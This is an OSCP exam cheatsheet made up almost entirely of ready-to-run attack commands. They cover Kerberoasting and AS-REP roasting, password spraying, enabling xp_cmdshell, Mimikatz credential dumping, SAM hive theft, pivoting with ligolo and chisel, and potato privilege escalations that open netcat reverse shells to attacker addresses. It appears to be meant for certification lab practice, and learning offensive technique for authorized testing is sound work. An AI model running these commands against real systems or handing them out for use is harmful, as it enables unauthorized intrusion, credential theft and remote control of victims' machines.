# OSCP Cheatsheet v2 - Exam Quick Reference

## 🚀 QUICK START
```bash
# Initial scan
./nmap-scan.sh <IP> -t 900 --no-udp

# Check privileges (Windows)
whoami /priv

# Check privileges (Linux)
sudo -l
```

## 🖥️ ACTIVE DIRECTORY LABS

### MS01 - Initial Foothold & Privilege Escalation

#### Check User Privileges
```powershell
# List current user's privileges
whoami /priv
```
**Look for**: `SeImpersonatePrivilege` → escalate to Local Admin

#### Domain Enumeration
```bash
# Enumerate domain users and build wordlist
nxc smb <target> -u <user> -p <pass> --users | awk '$1 == "SMB" && $5 != "[+]" && $5 != "-Username-" && $5 != "[*]" && $5 != "Guest" && $5 != "krbtgt" {print $5}' > domain_users

# Enumerate SMB shares
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

#### Active Directory Attacks
```bash
# AS-REP Roasting
impacket-GetNPUsers oscp.exam/ -dc-ip 10.10.X.X -no-pass -usersfile domain_users
hashcat -m 18200 asreproast_users /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# Kerberoasting
impacket-GetUserSPNs -request -dc-ip 10.10.X.X oscp.exam/<user>
hashcat -m 13100 kerberoast_users /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

#### SQL Server Access
```bash
# Impacket
mssqlclient.py <domain>/<user>@<host> -windows-auth
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# NetExec
nxc mssql <target> -u <user> -p <pass> --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql <target> -u <user> -p <pass> --local-auth -x whoami
```

#### Password Spraying
```bash
# Pass-spray for lateral movement/PE (local auth)
nxc smb domain_ips -u domain_users -p passwords --continue-on-success --local-auth | grep +

# Pass-spray for lateral movement/PE
nxc smb domain_ips -u domain_users -p passwords --continue-on-success | grep +

# Pass-spray for WinRM access
nxc winrm domain_ips -u domain_users -p passwords --continue-on-success | grep +

# Pass-spray for RDP access
nxc rdp domain_ips -u domain_users -p passwords --continue-on-success | grep +
```

#### Domain Data Collection
```bash
# Netexec
nxc ldap <dc-ip/FQDN> -u <user> -p <password> --bloodhound -c All --dns-server <dc-ip>

# Bloodhound-python
bloodhound-python -u <user> -p <password> -dc <FQDN> -c all -d <domain> -ns <dc-ip>
bloodhound-python -u <user> --hashes :<NTML> -dc <FQDN> -c all -d <domain> -ns <dc-ip>
```

### 🔎 Pillaging - Credential Dumping

#### Mimikatz Commands
```powershell
# Dump active sessions' creds
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump the SAM registry hive
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Dump the LSA secrets
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
```

#### PowerShell History
```powershell
# Check host type
$Host.Name

# Check the PS history of the current user
(Get-PSReadlineOption).HistorySavePath

# Check the PS history of another user
Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### 🖧 Pivoting with Ligolo

#### Attacking Host Setup
```bash
# Start proxy
sudo ligolo-proxy -selfcert

# Create the interface
ligolo-ng » interface_create --name ligolo
```

#### Target Host Setup
```bash
# Connect to the proxy
.\agent.exe -connect 192.168.X.X:11601 -ignore-cert
```

#### Routing Setup
```bash
# List active sessions
ligolo-ng » session

# Add route
ligolo-ng » interface_add_route --name ligolo --route 172.16.10.0/24

# Start the tunnel
ligolo-ng » start
```

### 🖥️ MS02 - Lateral Movement & Privilege Escalation

#### Initial Access
```bash
# Connect via WinRM
evil-winrm -u <user> -p <pass> -i <MS02>

# Connect via RDP
xfreerdp /u:<user> /p:<pass> /v:<MS02> /smart-sizing
```

#### Privilege Escalation Tools
```bash
# SigmaPotato
nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file SigmaPotato.exe C:\\Windows\\Temp\\sp.exe
nxc mssql <target-IP> -u <user> -p <pass> --local-auth -x "c:\windows\temp\sp.exe --revshell 10.10.14.5 53"

# PrintSpoofer
nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file PrintSpoofer64.exe C:\\Windows\\Temp\\pf.exe
nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file ../binaries/nc.exe C:\\Windows\\Temp\\nc.exe
nxc mssql <target-IP> -u <user> -p <pass> --local-auth -x 'c:\windows\temp\pf.exe -c "nc.exe 10.10.14.10 53 -e cmd"'

# GodPotato
nxc mssql <target-IP> -u <user> -p <pass> --put-file ../../tools/privesc/GodPotato-NET4.exe C:\\windows\\temp\\gp.exe
nxc mssql <target-IP> -u <user> -p <pass> --local-auth --put-file ../binaries/nc.exe C:\\Windows\\Temp\\nc.exe
nxc mssql <target-IP> -u <user> -p <pass> -x 'c:\windows\temp\gp.exe -cmd "c:\windows\temp\nc.exe -t -e C:\windows\system32\cmd.exe 192.168.45.164 80"'
```

#### SAM Dump from Windows.old
```bash
# Download files with nxc
nxc mssql <target-IP> -u sql_svc -p <pass> --get-file "c:\windows.old\windows\System32\SYSTEM" ./SYSTEM
nxc mssql <target-IP> -u sql_svc -p <pass> --get-file "c:\windows.old\windows\System32\SAM" ./SAM

# Dump SAM's hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

# Read flag
nxc smb dc01 -u tom_admin -H <hash> -X "type c:\users\administrator\desktop\proof.txt"
```

#### Network Enumeration
```powershell
# List active sockets
netstat -ano

# Check SMB access
nxc smb 192.168.X.X -u <user> -p <pass> --shares
```

#### Port Forwarding
```bash
# Start server on attacking host
./chisel server -p 8000 --reverse

# Transfer binary
wget http://192.168.X.X:8888/chisel.exe -o chisel.exe

# Start client on target (3306 to 6033)
.\chisel.exe client 192.168.X.X:8000 R:6033:127.0.0.1:3306

# Interact from attacking host
mysql -h 127.0.0.1 -P 6033 -u root
```

#### Reverse Port Forward
```bash
# Add listener to MS01 from Kali
[Agent : OSCP\eric.wallows@MS01] » listener_add --addr 0.0.0.0:4444 --to 0.0.0.0:4444

# Upload binary to MS02
nxc mssql ms02 -u sql_svc -p Dolphin1 --put-file 'nc.exe' 'c:\windows\temp\nc.exe'

# Execute binary from MS02 pointing to MS01
nxc mssql ms02 -u sql_svc -p Dolphin1 -x 'c:\windows\temp\nc.exe 10.10.63.147 4444 -e cmd.exe'
```

## 🖥️ STANDALONE MACHINES

### 🦶 Initial Foothold

#### Port Scanning
```bash
# TCP - manual probe for "weird" ports
nc -nv 192.168.X.X <port>
# help
# version

# UDP - SNMP enumeration
snmpwalk -v2c -c public <target>
snmpwalk -v2c -c public <target> 1.3.6.1.4.1
snmpwalk -v2c -c public <target> | grep -Ei 'user|admin|name|passwd'
```

#### Web Enumeration
```bash
# Directory enumeration
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt

# Git repository dump
git-dumper http://192.168.X.X/.git/ ./<local-dir>
git log | grep commit | cut -d " " -f2 | xargs git show > commits
```

### 🚀 Privilege Escalation

#### Linux Privilege Escalation
```bash
# Check sudo access
sudo -l

# Transfer PE scripts
wget http://192.168.X.X:8888/linpeas.sh -o linpeas.sh

# Check SUIDs
find / -type f -perm -u=s 2>/dev/null

# Check kernel version
uname -a

# Check active sockets
ss -tunlp
lsof -i :8000
ps aux | grep 8000

# Process monitoring
wget http://192.168.X.X:8888/pspy32 -o pspy32
./pspy32
```

#### Windows Privilege Escalation
```powershell
# Check privileges
whoami /priv

# Transfer PE scripts
wget http://192.168.X.X:8888/winPEASx64.exe -o winpeas.exe

# Check system info
systeminfo

# Check active sockets
netstat -ano
```

#### Port Forwarding (Linux)
```bash
# Start server on attacking host
./chisel server -p 8000 --reverse

# Transfer binary
wget http://192.168.X.X:8888/chisel -o chisel

# Start client on target (3306 to 6033)
./chisel client 192.168.X.X:8000 R:6033:127.0.0.1:3306

# Interact from attacking host
mysql -h 127.0.0.1 -P 6033 -u root
```

## ⚡ QUICK REFERENCE

### Common Ports & Services
| Port | Service | Common Exploits |
|------|---------|-----------------|
| 21   | FTP     | Anonymous access, default creds |
| 22   | SSH     | Default creds, key-based auth |
| 23   | Telnet  | Default creds, cleartext |
| 25   | SMTP    | User enumeration, relay |
| 53   | DNS     | Zone transfer, recursion |
| 80   | HTTP    | Web attacks, default pages |
| 443  | HTTPS   | Web attacks, SSL issues |
| 445  | SMB     | Anonymous access, password spray |
| 1433 | MSSQL   | xp_cmdshell, linked servers |
| 3389 | RDP     | BlueKeep, credential spray |

### Common File Locations
| OS | Location | Purpose |
|----|----------|---------|
| Linux | /etc/passwd | User accounts |
| Linux | /etc/shadow | Password hashes |
| Linux | /var/log/ | Log files |
| Windows | C:\Windows\System32\config\SAM | Password hashes |
| Windows | C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | PowerShell history |
| Windows | C:\Windows\Temp\ | Temporary files |

### One-Liner Commands
```bash
# Quick privilege check (Linux)
sudo -l 2>/dev/null | grep -E "(ALL|NOPASSWD)"

# Quick privilege check (Windows)
whoami /priv | findstr "Enabled"

# Quick service enumeration
nmap -sV -sC -p- <IP> --min-rate=1000

# Quick web enumeration
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -t 50

# Quick password spray
nxc smb <IP> -u admin -p admin,password,123456 --continue-on-success
```

## ⏰ EXAM NOTES

### Time Management
- **24 hours total**
- **5 machines** (3 standalone + 1 AD set)
- **Documentation time**: 30-60 minutes
- **Per machine**: ~4-5 hours max

### Documentation Requirements
- Screenshots of each step
- Commands used
- Proof of access (whoami, id)
- Root/Admin flags
- Methodology explanation

### Common Mistakes to Avoid
- Spending too long on one machine (>5 hours)
- Not documenting as you go
- Forgetting to check for low-hanging fruit
- Not having backup attack vectors
- Ignoring obvious services (FTP, Telnet)

### Quick Troubleshooting
```bash
# Connection issues
ping <IP>
telnet <IP> <PORT>
nc -zv <IP> <PORT>

# Authentication issues - try different formats
username
domain/username
username@domain.com
DOMAIN\username

# Common errors
# "Connection refused" → Service not running, wrong port
# "Access denied" → Wrong credentials, insufficient privileges
# "No output" → Check if command executed successfully
```

## 🔧 ESSENTIAL TOOLS

### Must-Have Tools
```bash
# Network scanning
nmap
netcat
nxc (netexec)

# Web enumeration
gobuster
dirb
nikto

# Active Directory
impacket-suite
bloodhound-python
evil-winrm

# Privilege escalation
linpeas
winpeas
pspy

# Pivoting
chisel
ligolo-ng

# Password cracking
hashcat
john
```

### Quick Setup Commands
```bash
# Update tools
sudo apt update && sudo apt upgrade -y

# Install essential packages
sudo apt install -y nmap netcat-openbsd gobuster hashcat john

# Install Python tools
pip3 install impacket bloodhound-python

# Download PE scripts
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
``` 